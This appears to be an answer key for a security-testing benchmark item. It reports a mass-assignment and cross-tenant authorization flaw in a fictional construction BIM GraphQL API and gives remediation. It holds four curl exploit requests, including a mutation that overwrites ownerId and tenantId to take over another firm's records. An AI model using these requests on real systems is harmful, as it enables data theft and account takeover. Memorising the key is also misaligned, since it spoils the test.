# Expected Response

## System
- System: BuildCore BIM Collaboration v1.7.6
- Domain: CONSTRUCTION / BIM PLATFORM
- Example ID: GQL-0428
- Risk ID: RISK-GQL-428

## Findings

### 1. Pattern 1.12 — Mass Assignment via `ownerId`/`tenantId` in `updateResource` Input (HAR Primary + Pattern Specific)

The `updateResource` mutation accepts `ownerId` and `tenantId` as writable fields in the `input` object (Section 5.0). Pattern 1.12 "mass assignment via object fields" — a client can mass-assign ownership attributes on any cross-tenant BIM resource by supplying an arbitrary `ownerId` and `tenantId` in the mutation input. Combined with the missing tenant check in the resolver (RISK-GQL-428), this enables taking ownership of another construction firm's BIM model records.

HAR shows `bulkResourceLookup(ids: ["R-2428", "R-1428", "R-3428"])` from `tenant-4498` returning `tenant-1c1b` data — confirms cross-tenant access. The mass assignment escalation via `updateResource` builds on this access.

**Evidence from HAR:**
- Request: `bulkResourceLookup` with cross-tenant IDs from `tenant-4498` (`x-tenant-id: tenant-4498`)
- Response `tenantId: "tenant-1c1b"` — cross-tenant BIM data returned
- `sensitiveField: "CONFIDENTIAL-44981c1b"` — construction IP/design data exposed

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-4498>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4498" \
  -d '{"query": "query { getResource(id: \"R-1428\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-4498"`.

**Step 2 — Mass assignment: overwrite ownerId/tenantId on cross-tenant BIM resource (Pattern 1.12 primary):**
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-4498>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4498" \
  -d '{"query": "mutation { updateResource(id: \"R-2428\", input: {ownerId: \"attacker-4498\", tenantId: \"tenant-4498\", status: \"published\"}) { resourceId tenantId ownerId status } }"}'
```
**Vulnerable outcome:** Returns updated BIM resource with `tenantId: "tenant-4498"` — competitor's BIM model ownership transferred to attacker; construction IP claimed by competing firm.

**Step 3 — Bulk cross-tenant BIM data enumeration (primary HAR attack):**
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-4498>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4498" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2428\", \"R-1428\", \"R-3428\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns BIM model data from multiple construction firms.

**Step 4 — Cross-tenant BIM read (RISK-GQL-428):**
```bash
curl -s -X POST https://api.buildcore-bim-collab.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-4498>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4498" \
  -d '{"query": "query { getResource(id: \"R-2428\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-1c1b"` — competitor's BIM design data exposed.

### 2. Redis Cache BIM Data Leak

Cache key is `resourceId` only. After mass assignment, the cache for `R-2428` may serve the attacker-owned version to the legitimate `tenant-1c1b` user.

## Secure Outcome
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": null }
```

## Remediation
- Resolver-level tenant check: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-428).
- Strip `ownerId` and `tenantId` from `updateResource` input type — server must set these from JWT, never from client input.
- Per-ID ownership filter in `bulkResourceLookup`.
- Fix Redis cache key: include `tenantId` (e.g., `resource:{tenantId}:{resourceId}`).
